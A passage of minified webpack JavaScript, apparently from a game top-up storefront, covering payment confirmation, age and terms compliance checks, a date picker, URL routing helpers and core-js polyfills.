e=j.__Report_INFO.countryCode.toUpperCase(),n=-1===j.noComplianceCountryList.indexOf(e);!m.isMidasLogin()&&n&&m.getComplianceRecord()&&j.showWelcomeBack&&Object(I.default)({msg:j.langResource.welcomeBack||'Welcome back!'})},pay:function(){var t,e,n,r,i;if(this.payClick+=1,this.isEditStatus)this.$refs.bindinput.setErrorStatus('Player ID is required');else{var o=j.__Report_INFO.countryCode.toUpperCase(),s=m.isMidasLogin(),a=-1===j.noComplianceCountryList.indexOf(o),c=m.getComplianceRecord();if(!s&&a&&!c){var u=-1!==j.complianceWithBirthCountryList.indexOf(o),f=this.checkedAgreementArray.every(function(t){return t});if(!(1<this.payClick))return this.checkedAgreementArray=this.checkedAgreementArray.map(function(){return!1}),E()('#confirmBirthdayTxt').html(j.langResource.enterBirthday).css('color',''),E()('#confirmBirthdayErrorTips').text('').hide(),u?(U.view('topup_payment_confirm_birthday'),null===(n=j.showBirthBox)||void 0===n?void 0:n.call(j)):(U.view('topup_payment_confirm_terms'),null===(r=j.showClauseBg)||void 0===r?void 0:r.call(j));if(!f)return u&&!this.birthValidate?(U.view('topup_payment_confirm_birthday'),null===(t=j.showBirthBox)||void 0===t?void 0:t.call(j)):(U.view('topup_payment_confirm_terms'),null===(e=j.showClauseBg)||void 0===e?void 0:e.call(j));m.saveComplianceRecord(),E()('.clause-box-pop').css('bottom','-1000px'),setTimeout(function(){E()('.clause-bg').fadeOut()},100)}var l={channel:this.activeTab.channel,subchannel:this.activeTab.subchannel,id:this.activeTab.id},d=m.getPublicParams(l),p=this.activeTab.payParams||{};if(null!==p&&p.isv3&&(d.provide_type='uni_pdt',d.product_num='1',d.buytype='xx',d.___forcetype=1),(d=P()(d,l,p)).newtab=B?d.h5_newtab||d.newtab:d.pc_newtab||d.newtab,""+this.activeTab.isWechat=='1')if(B){var h=document.getElementById('hiddenFrame');h||((h=document.createElement('iframe')).setAttribute('src','about:blank'),h.style.display='none',h.id='hiddenFrame',document.body.appendChild(h)),d.target=h.contentWindow,d.forcepop=1,d.wxopenid=this.wxopenid}else this.showWechatPop=!0,this.cssObj=this.activeTab.cssObj||{},d.target=this.$refs.wechatPop.$refs.iframe.contentWindow;else""+this.activeTab.isAdyen=='1'?(this.showWechatPop=!0,this.cssObj=this.activeTab.cssObj||{},d.target=this.$refs.wechatPop.$refs.iframe.contentWindow):void 0===d.newtab||""+d.newtab=='1'?d.newtab=1:""+d.newtab=='0'&&(this.showIframePop=!0,this.cssObj=this.activeTab.cssObj||{},d.target=this.$refs.iframePop.$refs.iframe.contentWindow);R.shopcartv2&&(d.provide_type='uni_pdt_v2',d.product_list=JSON.stringify([{product_id:d.productid,num:'1',offer_id:R.appid,product_info:{area:1,roleid:R.openid}}]));var v=m.getActiveData();v&&v.length<600&&(d.cgi_extend=d.cgi_extend||'',d.cgi_extend+=encodeURIComponent((d.cgi_extend?'&comm_data=':'comm_data=')+v)),d.version='midasbuy_v2',U.click('payment_confirm',{channel:d.channel,subchannel:d.subchannel,productid:d.productid}),Object(O.a)("orderdata_"+m.getStorageKey(),{channel:d.channel,subchannel:d.subchannel,productid:d.productid}),null!==(i=j.dataLayer)&&void 0!==i&&i.push({event:'UC_CHECKOUT',paymentType:this.activeTab.name,paymentTypeId:this.activeTab.id,price:d.ca,productid:d.productid}),j.midas.buyGame(d,{onMessage:function(t){1!==d.newtab&&!d.forcepop||(V.msgObj=t,V.showResPop=!0,V.resQueryPop=!0)}})}},goRedeem:function(){x.a.redeem(m.browserParams)},goShop:function(){x.a.shop(m.browserParams)},refreshPage:function(){location.reload()},cancel:function(){this.resQueryPop=!1,this.showResPop=!1,this.queryRes(1)},queryRes:function(e){void 0===e&&(e=0),""+this.activeTab.isWechat=='1'&&B&&document.getElementById('hiddenFrame').contentWindow.postMessage(JSON.stringify({action:'wechat_stop_poll'}),'*');this.resQueryPop=!1,this.queryingPop=!0;var n=this;m.getPayRes(this.msgObj.portal_serial_no).then(function(t){0===t.ret?(n.queryingPop=!1,j.__CALLBACKINTERFACE("status=success&buy_type_key="+m.getStorageKey()+"&restoken="+t.token)):e||n.nores()}).catch(function(){e||n.nores()})},nores:function(){this.queryingPop=!1,this.noResFound=!0},iknow:function(){this.noResFound=!1,this.showResPop=!1},showMessageBox:function(){V.$refs.messageBox.show()},closeMessageBox:function(){V.$refs.messageBox.hide()}},components:{wechatPop:v.default,iframePop:g.default,tab:l.default,list:d.default,channeltips:p.default,alertbox:y.default,bindinput:h.default,message:_.default,messageBox:b.default}});m.onDataChange(function(){V.tabsData=m.getChannelData()}),m.onTokenExpire(function(){V.$refs.alertbox.show()});var $=!(j.__CALLBACKINTERFACE=function(t){var e=k()(t),n=V.activeTab,r=m.getBrowserParams(),i=m._getInterfaceParams().appid;if('success'===(e=P()({appid:i},e,r)).status)e.type=n.type,Object(C.a)(e),Object(O.a)('resultPageType','buy'),x.a.result(e);else if('error'===e.status){m.getCurrentChannel().showErrorInfo&&(V.payErrorInfo=e.error_message);var o=j.__showErrorDetail[R.country.toLowerCase()];if('*'===o||Array.isArray(o)&&-1!==o.indexOf(R.appid)){var s=j.langResource.errorMap||{};V.payErrorInfo=s[e.error_code]||''}V.showErrorBox=!0,V.showWechatPop=!1,V.showIframePop=!1,U.view('topup_order_error',e)}}),G=new M({el:'#confirmBirthdayLine',droplistinbody:!B,day:'1990-01-01',fixed:!0,pick:function(t){var e=t.getFullYear()+"-"+(t.getMonth()+1)+"-"+t.getDate();E()('#confirmBirthdayTxt').css('color','#000').html(e),E()('#confirmBirth').val(e).change()},beforeHide:function(){$=!0,setTimeout(function(){$=!1},100)}});E()('#confirmBirthdayBtn').on('click',function(t){var e=E()('#confirmBirthdayTxt').text(),n=function(n,t){n=n.toLowerCase();var r,e=j.buylimits||{},i=function(t){var e=t.split('-'),n=+e[0],r=+e[1],i=+e[2],o=new Date,s=o.getFullYear(),a=o.getMonth()+1,c=o.getDate(),u=s-n;if(0<u){var f=a-r,l=c-i;(f<0||0==f&&l<0)&&--u}return u}(t);return E.a.each(e,function(t,e){if(e.country instanceof Array&&-1!==e.country.indexOf(n))return r=e,!1;'*'===e.country&&(r=e)}),{ret:!r||i>=r.minage,minage:r?r.minage:''}}(j.__Report_INFO.countryCode.toUpperCase(),e),r=j.langResource;U.click('payment_confirm_birthday_confirm'),n.ret?(E()('#confirmBirthdayErrorTips').text('').hide(),V.birthValidate=!0,j.hideBirthBox(),j.showClauseBg()):(E()('.error-wrap-center').show(),E()('#confirmBirthdayErrorTips').text((r.birthdayError||'').replace('{}',n.minage)).show(),U.view('topup_payment_confirm_birthday_aprevent'))}),E()('#confirmBirthdayLine').on('click',function(t){$?$=!1:G.show()}),E()('#birthBoxCloseBtn').on('click',function(){j.hideBirthBox()})},MBcE:function(t,e,n){"use strict";var r=n("PAFS");t.exports=function(){var t=r(this),e='';return t.global&&(e+='g'),t.ignoreCase&&(e+='i'),t.multiline&&(e+='m'),t.unicode&&(e+='u'),t.sticky&&(e+='y'),e}},MCcP:function(t,e,n){"use strict";e.a={CURRENT_BUY_ITEM:'CURRENT_BUY_ITEM',CURRENT_LOCATION:'CURRENT_LOCATION'}},"N6/Q":function(t,e,n){"use strict";var r=n("lAKj");n("X6VK")({target:'RegExp',proto:!0,forced:r!==/./.exec},{exec:r})},"NVL/":function(t,e,n){var r=n("Bsg+"),i=n("n+VH"),o=n("9dxi")('match');t.exports=function(t){var e;return r(t)&&(void 0!==(e=t[o])?!!e:'RegExp'==i(t))}},OFVL:function(t,e,n){var i=n("n+VH"),o=n("9dxi")('toStringTag'),s='Arguments'==i(function(){return arguments}());t.exports=function(t){var e,n,r;return void 0===t?'Undefined':null===t?'Null':'string'==typeof(n=function(t,e){try{return t[e]}catch(t){}}(e=Object(t),o))?n:s?i(e):'Object'==(r=i(e))&&'function'==typeof e.callee?'Arguments':r}},OU6u:function(t,e,n){"use strict";var r=n("X6VK"),i=n("gtO+"),o=n("Yvte");r(r.S,'Promise',{try:function(t){var e=i.f(this),n=o(t);return(n.e?e.reject:e.resolve)(n.v),e.promise}})},OfmW:function(t,e,n){var r=n("9dxi")('unscopables'),i=Array.prototype;null==i[r]&&n("tjmq")(i,r,{}),t.exports=function(t){i[r][t]=!0}},P56o:function(t,e){var n=t.exports='undefined'!=typeof window&&window.Math==Math?window:'undefined'!=typeof self&&self.Math==Math?self:Function('return this')();'number'==typeof __g&&(__g=n)},P9Fj:function(t,e,n){"use strict";n("BTfu"),n("4aJ6"),n("M/4x"),n("t91x"),n("Z8gF"),n("it7j"),n("asZ9");function r(t){this.opts=t||{el:'',day:'',droplistinbody:!1,pick:function(){}},this.init()}var s={WEEKTABLE:['Sun','Mon','Tue','Wed','Thu','Fri','Sat'],MONTHTABLE:['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],getCurrentDay:function(){var t=new Date;return[t.getFullYear(),t.getMonth()+1,t.getDate()]},fixedYM:function(t,e){return 0==+e&&(--t,e=12),13==+e&&(t=+t+1,e=1),[t,e]},getMonthDays:function(t,e){var n=this.fixedYM(t,e);return new Date(n[0],n[1],0).getDate()},getWeekday:function(t,e,n){var r=this.fixedYM(t,e);return new Date(r[0],r[1]-1,n).getDay()},getMonthDaysArray:function(t,e){for(var n=[],r=this.getMonthDays(t,e),i=this.getMonthDays(t,e-1),o=this.getWeekday(t,e,1),s=this.getWeekday(t,e,r),a=0;a<o;a++)n.push({dayNum:i-o+a+1,weekDay:this.WEEKTABLE[a]});for(var c=1;c<=r;c++){var u=(o+c-1)%7;n.push({dayNum:c,weekDay:this.WEEKTABLE[u],isThisMonth:!0})}for(var f=1;f<=6-s;f++){var l=(o+r+f-1)%7;n.push({dayNum:f,weekDay:this.WEEKTABLE[l]})}return n}};r.prototype={init:function(){var t=new Date;if(this.opts.day){var e=this.opts.day.split('-');3===e.length&&(t=new Date(parseInt(e[0]),parseInt(e[1])-1,parseInt(e[2])))}if(this.opts.selectedDay){var n=this.opts.selectedDay.split('-');3===n.length&&(this.selectedDay=new Date(parseInt(n[0]),parseInt(n[1])-1,parseInt(n[2])))}this.currentDay=t,this.$el=$(this.opts.el),this.buildTem(),this.bindEvent()},fixYM:function(t,e){return 11<e&&(e=0,t+=1),e<0&&(e=11,--t),[t,e]},addMonth:function(){var t=this.currentDay.getFullYear(),e=this.currentDay.getMonth()+1,n=this.fixYM(t,e);this.currentDay.setFullYear(n[0]),this.currentDay.setMonth(n[1]),this.updateTem()},subMonth:function(){var t=this.currentDay.getFullYear(),e=this.currentDay.getMonth()-1,n=this.fixYM(t,e);this.currentDay.setFullYear(n[0]),this.currentDay.setMonth(n[1]),this.updateTem()},addYear:function(){var t=this.currentDay.getFullYear()+1;this.currentDay.setFullYear(t),this.updateTem()},subYear:function(){var t=this.currentDay.getFullYear()-1;this.currentDay.setFullYear(t),this.updateTem()},_getWeekStr:function(t){for(var e='',n=0;n<t.length;n++)e+="<div class=\"td\">"+t[n]+"</div>";return e},_getDayStr:function(t){for(var e='',n=0;n<t.length;n++){e+="<li class=\""+(t[n].selected?'selected':t[n].isThisMonth&&!this.isFutureDate(t[n].dayNum)?'':'light')+"\"><span>"+t[n].dayNum+"</span></li>"}return e},getDta:function(){var t=this.currentDay.getFullYear(),e=this.currentDay.getMonth()+1,n=this.selectedDay&&this.selectedDay.getFullYear(),r=this.selectedDay&&this.selectedDay.getMonth()+1,i=this.selectedDay&&this.selectedDay.getDate(),o=s.getMonthDaysArray(t,e);return n===t&&r===e&&(o.find(function(t){return t.dayNum===i}).selected=!0),{year:t,month:e,monthstr:s.MONTHTABLE[this.currentDay.getMonth()],weekstr:this._getWeekStr(s.WEEKTABLE),dayStr:this._getDayStr(o)}},isLastestYear:function(){var t=new Date;return this.currentDay.getFullYear()===t.getFullYear()},isFutureDate:function(t){var e=new Date;return this.isLastestYear()&&this.isLastestMonth()&&t>e.getDate()},isLastestMonth:function(){var t=new Date;return this.isLastestYear()&&this.currentDay.getMonth()===t.getMonth()},_innerTem:function(){var t=this.getDta();return" <div class=\"title\">\n                        <div class=\"pre-year\" style=\"cursor: pointer;\"></div>\n                        <div class=\"pre-month\" style=\"cursor: pointer;\"></div>\n                        <div class=\"next-month\" style=\"cursor: pointer;"+(this.isLastestMonth()&&'opacity: .2;')+"\"></div>\n                        <div class=\"next-year\" style=\"cursor: pointer;"+(this.isLastestYear()&&'opacity: .2;')+"\"></div>\n                        <p>"+t.monthstr+"  "+t.year+"</p>\n                   </div>\n        <div class=\"th\">"+t.weekstr+"</div>\n        <div class=\"bd\">\n            <ul>"+t.dayStr+"</ul>\n        </div>"},updateTem:function(){var t=this.currentDay.getFullYear(),e=this.currentDay.getMonth(),n=this.currentDay.getDate(),r=new Date,i=r.getFullYear(),o=r.getMonth(),s=r.getDate(),a=t,c=e,u=n;i<t?(a=i,c=o,u=s):t===i&&(o<e?(c=o,u=s):e===o&&s<=n&&(u=s)),this.currentDay.setFullYear(a),this.currentDay.setMonth(c),this.currentDay.setDate(u),this.$cal.html(this._innerTem())},buildTem:function(){var t=this._innerTem();this.caid=Math.random().toString().replace('.','');var e="<div class=\"time-picker-box\" tabindex=\"-1\" style=\"display:none;outline:0;\" id=\""+this.caid+"\">"+t+"</div>";this.opts.droplistinbody?$('body').after(e):this.$el.after(e),this.$cal=$("#"+this.caid)},bindEvent:function(){var e=!1,n=this;this.$cal.off().on('mouseenter',function(){e=!0}).on('mouseleave',function(){e=!1}).on('click',function(t){var e=$(t.target);if(e.hasClass('pre-month'))t.preventDefault(),n.subMonth();else if(e.hasClass('next-month')){if(t.preventDefault(),n.isLastestMonth())return!1;n.addMonth()}else if(e.hasClass('next-year')){if(t.preventDefault(),n.isLastestYear())return!1;n.addYear()}else e.hasClass('pre-year')&&(t.preventDefault(),n.subYear())}).on('click','li',function(t){if(!$(this).hasClass('light')){var e=$(this).find('span').html();n.selectDay(e)}}).on('blur',function(t){e||(n.hide(),$('#rightCheckbox1').focus())}),$(window).on('resize',function(){n.resize()})},selectDay:function(t){this.currentDay.setDate(t),this.selectedDay=new Date(this.currentDay),this.updateTem(),this.hide(),this.opts.pick(this.currentDay)},setValue:function(){},getValue:function(){},resize:function(){this.opts.droplistinbody&&this.isShow&&this.setPosition()},setPosition:function(){if(this.opts.droplistinbody){var t=this.$el.get(0).getBoundingClientRect(),e=t.top,n=t.left;if(this.opts.fixed){var r=this.$el.offset();e=r.top,n=r.left}this.$cal.css({top:e+t.height+1,left:n,right:'auto'})}},hide:function(){this.opts.beforeHide&&'function'==typeof this.opts.beforeHide&&this.opts.beforeHide(),this.$cal.hide(),this.isShow=0},show:function(){this.setPosition(),this.$cal.show().focus(),this.isShow=1}},t.exports=r},PAFS:function(t,e,n){var r=n("Bsg+");t.exports=function(t){if(!r(t))throw TypeError(t+' is not an object!');return t}},Pf6g:function(t,e,n){"use strict";var r=n("51+d"),i=n("ubrs"),o=n("psIG"),s=Object(o.a)(i.default,r.a,r.b,!1,null,null,null);e.default=s.exports},QMnT:function(t,e,n){"use strict";e.a=function(t,e){if(null===e)window.localStorage&&window.localStorage.removeItem(t);else{'object'==typeof e&&e&&!e.saveTime&&(e.saveTime=(new Date).getTime());try{var n=JSON.stringify(e);window.localStorage&&window.localStorage.setItem(t,n)}catch(t){}}}},Qno1:function(t,e,n){var r=n("Bsg+"),i=n("Xfku"),o=n("9dxi")('species');t.exports=function(t){var e;return i(t)&&('function'!=typeof(e=t.constructor)||e!==Array&&!i(e.prototype)||(e=void 0),r(e)&&null===(e=e[o])&&(e=void 0)),void 0===e?Array:e}},R5TD:function(t,e){var n=t.exports={version:'2.6.11'};'number'==typeof __e&&(__e=n)},RKkF:function(t,e,n){"use strict";var r=n("TkHm"),i=n.n(r);e.default=i.a},ROCd:function(t,e,n){var r=n("P56o").navigator;t.exports=r&&r.userAgent||''},SRKO:function(t,e,n){"use strict";var o=n("I2RX");e.a=function(r,i){for(var t=localStorage.length,e=[],n=0;n<t;n++)e.push(localStorage.key(n));e.forEach(function(t){if(t&&-1!==t.indexOf(r)){var e=Object(o.a)(t),n=(new Date).getTime();e&&e.saveTime&&e.saveTime+i<n&&localStorage.removeItem(t)}})}},Sp5b:function(t,e,n){var r=n("mvii"),i=Math.min;t.exports=function(t){return 0<t?i(r(t),9007199254740991):0}},SvMv:function(t,e){t.exports="\t\n\v\f\r   ᠎             　\u2028\u2029\ufeff"},TkHm:function(t,e,n){"use strict";n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var r={name:"channeltips",props:{datas:Object}};e.default=r},U1KF:function(t,e,n){var r=n("PAFS"),i=n("HWsP"),o=n("5MU4"),s=Object.defineProperty;e.f=n("GGqZ")?Object.defineProperty:function(t,e,n){if(r(t),e=o(e,!0),r(n),i)try{return s(t,e,n)}catch(t){}if('get'in n||'set'in n)throw TypeError('Accessors not supported!');return'value'in n&&(t[e]=n.value),t}},U8p0:function(t,e,n){"use strict";var r=n("X6VK"),i=n("b8Rm"),o=n("UnHL"),s=n("E7Vc"),a=[].sort,c=[1,2,3];r(r.P+r.F*(s(function(){c.sort(void 0)})||!s(function(){c.sort(null)})||!n("/6rt")(a)),'Array',{sort:function(t){return void 0===t?a.call(o(this)):a.call(o(this),i(t))}})},UnHL:function(t,e,n){var r=n("GCOZ");t.exports=function(t){return Object(r(t))}},V7cS:function(t,e,n){"use strict";var r=n("X6VK"),i=n("sdkr")(!1),o=[].indexOf,s=!!o&&1/[1].indexOf(1,-0)<0;r(r.P+r.F*(s||!n("/6rt")(o)),'Array',{indexOf:function(t,e){return s?o.apply(this,arguments)||0:i(this,t,e)}})},VNvs:function(t,e,n){"use strict";var r=n("X6VK"),i=n("1wfo")(3);r(r.P+r.F*!n("/6rt")([].some,!0),'Array',{some:function(t,e){return i(this,t,e)}})},VVFi:function(t,e){t.exports=function(t,e){return{value:e,done:!!t}}},VrDC:function(t,e,n){"use strict";var r=n("Jzx5"),i=n("c852"),o=n("psIG"),s=Object(o.a)(i.default,r.a,r.b,!1,null,null,null);e.default=s.exports},"Vx+c":function(t,e,r){function i(){}var o=r("PAFS"),s=r("pU1/"),a=r("fQty"),c=r("8kJd")('IE_PROTO'),u='prototype',f=function(){var t,e=r("mggL")('iframe'),n=a.length;for(e.style.display='none',r("CLuC").appendChild(e),e.src='javascript:',(t=e.contentWindow.document).open(),t.write("<script>document.F=Object<\/script>"),t.close(),f=t.F;n--;)delete f[u][a[n]];return f()};t.exports=Object.create||function(t,e){var n;return null!==t?(i[u]=o(t),n=new i,i[u]=null,n[c]=t):n=f(),void 0===e?n:s(n,e)}},W1QL:function(t,e,n){for(var r=n("K/PF"),i=n("LuBU"),o=n("sU/p"),s=n("P56o"),a=n("tjmq"),c=n("Ibj2"),u=n("9dxi"),f=u('iterator'),l=u('toStringTag'),d=c.Array,p={CSSRuleList:!0,CSSStyleDeclaration:!1,CSSValueList:!1,ClientRectList:!1,DOMRectList:!1,DOMStringList:!1,DOMTokenList:!0,DataTransferItemList:!1,FileList:!1,HTMLAllCollection:!1,HTMLCollection:!1,HTMLFormElement:!1,HTMLSelectElement:!1,MediaList:!0,MimeTypeArray:!1,NamedNodeMap:!1,NodeList:!0,PaintRequestList:!1,Plugin:!1,PluginArray:!1,SVGLengthList:!1,SVGNumberList:!1,SVGPathSegList:!1,SVGPointList:!1,SVGStringList:!1,SVGTransformList:!1,SourceBufferList:!1,StyleSheetList:!0,TextTrackCueList:!1,TextTrackList:!1,TouchList:!1},h=i(p),v=0;v<h.length;v++){var m,g=h[v],y=p[g],_=s[g],b=_&&_.prototype;if(b&&(b[f]||a(b,f,d),b[l]||a(b,l,g),c[g]=d,y))for(m in r)b[m]||o(b,m,r[m],!0)}},W3jp:function(t,e,n){"use strict";var r=n("aX7j"),i=n("GGM0"),o=n("psIG"),s=Object(o.a)(i.default,r.a,r.b,!1,null,null,null);e.default=s.exports},WWmS:function(t,e){t.exports=function(t,e){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:e}}},WbYP:function(t,e,n){"use strict";var r,i=n("ifxA");(r=window.sdk_rules)&&Object(i.a)({intercept:JSON.stringify(r)})},Wifh:function(t,e,n){"use strict";n("N6/Q");var f=n("sU/p"),l=n("tjmq"),d=n("E7Vc"),p=n("GCOZ"),h=n("9dxi"),v=n("lAKj"),m=h('species'),g=!d(function(){var t=/./;return t.exec=function(){var t=[];return t.groups={a:'7'},t},'7'!==''.replace(t,'$<a>')}),y=function(){var t=/(?:)/,e=t.exec;t.exec=function(){return e.apply(this,arguments)};var n='ab'.split(t);return 2===n.length&&'a'===n[0]&&'b'===n[1]}();t.exports=function(n,t,e){var r=h(n),o=!d(function(){var t={};return t[r]=function(){return 7},7!=''[n](t)}),i=o?!d(function(){var t=!1,e=/a/;return e.exec=function(){return t=!0,null},'split'===n&&(e.constructor={},e.constructor[m]=function(){return e}),e[r](''),!t}):void 0;if(!o||!i||'replace'===n&&!g||'split'===n&&!y){var s=/./[r],a=e(p,r,''[n],function(t,e,n,r,i){return e.exec===v?o&&!i?{done:!0,value:s.call(e,n,r)}:{done:!0,value:t.call(n,e,r)}:{done:!1}}),c=a[0],u=a[1];f(String.prototype,n,c),l(RegExp.prototype,r,2==t?function(t,e){return u.call(t,this,e)}:function(t){return u.call(t,this)})}}},WyNz:function(t,e,n){"use strict";var r=n("H0Xg"),i=n("kqRc"),o=n("psIG"),s=Object(o.a)(i.default,r.a,r.b,!1,null,null,null);e.default=s.exports},X1H8:function(t,e,n){"use strict";function r(){var t=this,e=t.$createElement,n=t._self._c||e;return n('div',{staticClass:"pop-box",class:{show:t.isShow}},[n('div',{staticClass:"pop pop-one",class:{show:t.isShow}},[n('p',{staticClass:"title"},[t._v(t._s(t.title))]),t._v(" "),n('p',{staticClass:"desc",domProps:{innerHTML:t._s(t.desc)}}),t._v(" "),n('div',{staticClass:"btn-box"},[n('div',{staticClass:"btn cancel-btn",on:{click:t.clickBtn}},[t._v(t._s(t.btn))])])])])}var i=[];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},X6VK:function(t,e,n){var v=n("P56o"),m=n("R5TD"),g=n("tjmq"),y=n("sU/p"),_=n("9liC"),b='prototype',w=function(t,e,n){var r,i,o,s,a=t&w.F,c=t&w.G,u=t&w.S,f=t&w.P,l=t&w.B,d=c?v:u?v[e]||(v[e]={}):(v[e]||{})[b],p=c?m:m[e]||(m[e]={}),h=p[b]||(p[b]={});for(r in c&&(n=e),n)o=((i=!a&&d&&void 0!==d[r])?d:n)[r],s=l&&i?_(o,v):f&&'function'==typeof o?_(Function.call,o):o,d&&y(d,r,o,t&w.U),p[r]!=o&&g(p,r,s),f&&h[r]!=o&&(h[r]=o)};v.core=m,w.F=1,w.G=2,w.S=4,w.P=8,w.B=16,w.W=32,w.U=64,w.R=128,t.exports=w},XDzM:function(t,e,n){var a=n("P56o"),c=n("5BMI").set,u=a.MutationObserver||a.WebKitMutationObserver,f=a.process,l=a.Promise,d='process'==n("n+VH")(f);t.exports=function(){function t(){var t,e;for(d&&(t=f.domain)&&t.exit();n;){e=n.fn,n=n.next;try{e()}catch(t){throw n?i():r=void 0,t}}r=void 0,t&&t.enter()}var n,r,i;if(d)i=function(){f.nextTick(t)};else if(!u||a.navigator&&a.navigator.standalone)if(l&&l.resolve){var e=l.resolve(void 0);i=function(){e.then(t)}}else i=function(){c.call(a,t)};else{var o=!0,s=document.createTextNode('');new u(t).observe(s,{characterData:!0}),i=function(){s.data=o=!o}}return function(t){var e={fn:t,next:void 0};r&&(r.next=e),n||(n=e,i()),r=e}}},Xfku:function(t,e,n){var r=n("n+VH");t.exports=Array.isArray||function(t){return'Array'==r(t)}},Y6fs:function(t,e,n){"use strict";var r=n("63Ad");n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0,n("asZ9"),n("V7cS"),n("Z8gF");function i(){var t=location.pathname,e=window._SHOPCODE?'/'+window._SHOPCODE:'';return t.replace(e,'')}var s=r(n("wvFD")),o=r(n("9f4c")),a=r(n("p6P0")),c=r(n("asvx")),u=r(n("BUht"));function f(t,e,n){-1===t.indexOf('/login')&&e&&delete e.redirect;var r=u.default.isEmptyObject(e)?'':'?'+(0,s.default)(e,!0),i='string'==typeof n?'#'+n:'',o=(t=window._SHOPCODE?'/'+window._SHOPCODE+t:t)+r+i;location.href=location.origin+o}window.location.origin||(window.location.origin=window.location.protocol+'//'+window.location.hostname+(window.location.port?':'+window.location.port:''));var l={getShortUrl:function(){var t=i().split('/');return 3<t.length?'/'+t[3]:''},getCountry:function(){var t=i().substr(0,4),e=/\/(\w{2})[\/#\?]|\/(\w{2})$/.exec(t);return e?e[1]||e[2]:'ot'},from:function(t,e){var n=(0,o.default)(),r=n.redirect&&-1!==n.redirect.indexOf(window.location.host);n.redirect&&r?location.href=n.redirect:this.home(t,e)},home:function(t,e){f("/"+this.getCountry(),t,e)},login:function(t,e){var n=(0,c.default)('redirect',decodeURIComponent(t.redirect));t.redirect=n,f("/"+this.getCountry()+"/login",t,e)},usercenter:function(t,e){f("/"+this.getCountry()+"/usercenter",t,e)},forget:function(t,e){f("/"+this.getCountry()+"/forget",t,e)},regionselect:function(t,e){f("/"+this.getCountry()+"/regionselect"+this.getShortUrl(),t,e)},modify:function(t,e){f("/"+this.getCountry()+"/modify",t,e)},currency:function(t,e){f("/"+this.getCountry()+"/buy"+this.getShortUrl(),t,e)},redeem:function(t,e){f("/"+this.getCountry()+"/redeem"+this.getShortUrl(),t,e)},shop:function(t,e){f("/"+this.getCountry()+"/shop"+this.getShortUrl(),t,e)},sub:function(t,e){f("/"+this.getCountry()+"/sub"+this.getShortUrl(),t,e)},country:function(t,e,n){f("/"+t,e,n)},proporder:function(t,e,n){e.pid=t,f("/"+this.getCountry()+"/props_order"+this.getShortUrl(),e,n)},suborder:function(t,e,n){e.pid=t,f("/"+this.getCountry()+"/sub_order"+this.getShortUrl(),e,n)},result:function(t){(t=t||{}).gameShortUrl=this.getShortUrl().replace('/',''),f("/"+this.getCountry()+"/result",t,null)},transcation:function(t,e){f("/"+this.getCountry()+"/transcation",t,e)},linkto:function(t,e){var n,r=(0,o.default)();n=r.from?(0,a.default)({from:r.from},t):t,e?location.replace(n):location.href=n}};e.default=l},Yvte:function(t,e){t.exports=function(t){try{return{e:!1,v:t()}}catch(t){return{e:!0,v:t}}}},Z8gF:function(t,e,n){"use strict";var I=n("PAFS"),r=n("UnHL"),O=n("Sp5b"),S=n("mvii"),P=n("dVhv"),D=n("Fu0I"),E=Math.max,T=Math.min,d=Math.floor,p=/\$([$&`']|\d\d?|<[^>]*>)/g,h=/\$([$&`']|\d\d?)/g;n("Wifh")('replace',2,function(i,o,w,x){return[function(t,e){var n=i(this),r=null==t?void 0:t[o];return void 0!==r?r.call(t,n,e):w.call(String(n),t,e)},function(t,e){var n=x(w,t,this,e);if(n.done)return n.value;var r=I(t),i=String(this),o='function'==typeof e;o||(e=String(e));var s=r.global;if(s){var a=r.unicode;r.lastIndex=0}for(var c=[];;){var u=D(r,i);if(null===u)break;if(c.push(u),!s)break;''===String(u[0])&&(r.lastIndex=P(i,O(r.lastIndex),a))}for(var f,l='',d=0,p=0;p<c.length;p++){u=c[p];for(var h=String(u[0]),v=E(T(S(u.index),i.length),0),m=[],g=1;g<u.length;g++)m.push(void 0===(f=u[g])?f:String(f));var y=u.groups;if(o){var _=[h].concat(m,v,i);void 0!==y&&_.push(y);var b=String(e.apply(void 0,_))}else b=C(h,i,v,m,y,e);d<=v&&(l+=i.slice(d,v)+b,d=v+h.length)}return l+i.slice(d)}];function C(o,s,a,c,u,t){var f=a+o.length,l=c.length,e=h;return void 0!==u&&(u=r(u),e=p),w.call(t,e,function(t,e){var n;switch(e.charAt(0)){case'$':return'$';case'&':return o;case'`':return s.slice(0,a);case"'":return s.slice(f);case'<':n=u[e.slice(1,-1)];break;default:var r=+e;if(0==r)return t;if(l<r){var i=d(r/10);return 0===i?t:i<=l?void 0===c[i-1]?e.charAt(1):c[i-1]+e.charAt(1):t}n=c[r-1]}return void 0===n?'':n})}})},ZVIm:function(t,e,n){var r=n("R5TD"),i=n("P56o"),o='__core-js_shared__',s=i[o]||(i[o]={});(t.exports=function(t,e){return s[t]||(s[t]=void 0!==e?e:{})})('versions',[]).push({version:r.version,mode:n("wEu9")?'pure':'global',copyright:'© 2019 Denis Pushkarev (zloirock.ru)'})},aX7j:function(t,e,n){"use strict";function r(){var t=this,e=t.$createElement,n=t._self._c||e;return n('div',{directives:[{name:"show",rawName:"v-show",value:t.show,expression:"show"}],staticClass:"code-pay-pop"},[n('div',{staticClass:"pop-box show",staticStyle:{width:"100%","max-width":"1024px",height:"600px",padding:"45px 0","box-sizing":"content-box"},attrs:{id:"iframeWrap"}},[n('div',{staticClass:"close",attrs:{cr:'pop_close.'+t.channel.id},on:{click:t.close}}),t._v(" "),t.appendIFrame?n('iframe',{ref:"iframe",staticStyle:{width:"100%","max-width":"1024px",height:"600px"},attrs:{id:"iframe",frameborder:"0"}}):t._e()])])}var i=[];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},asZ9:function(t,e,n){"use strict";var l=n("NVL/"),_=n("PAFS"),b=n("5Fu2"),w=n("dVhv"),x=n("Sp5b"),C=n("Fu0I"),d=n("lAKj"),r=n("E7Vc"),I=Math.min,p=[].push,s='split',h='length',v='lastIndex',O=4294967295,S=!r(function(){RegExp(O,'y')});n("Wifh")('split',2,function(i,o,m,g){var y;return y='c'=='abbc'[s](/(b)*/)[1]||4!='test'[s](/(?:)/,-1)[h]||2!='ab'[s](/(?:ab)*/)[h]||4!='.'[s](/(.?)(.?)/)[h]||1<'.'[s](/()()/)[h]||''[s](/.?/)[h]?function(t,e){var 